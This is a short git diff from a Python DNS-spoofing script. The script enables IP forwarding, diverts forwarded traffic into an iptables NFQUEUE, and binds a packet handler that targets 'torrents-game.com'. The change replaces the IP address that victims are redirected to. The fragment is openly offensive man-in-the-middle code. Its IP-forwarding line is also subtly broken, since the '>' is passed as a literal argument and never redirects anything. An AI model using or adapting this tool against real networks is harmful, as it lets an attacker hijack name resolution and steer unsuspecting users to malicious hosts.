@@ -27,7 +27,7 @@ def process_packet(packet):
 subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
 subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num 0"])
 try:
-    ip = "192.168.148.188"  # IP address for target
+    ip = "192.168.1.1"  # IP address for target
     url = "torrents-game.com"  # Target url
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
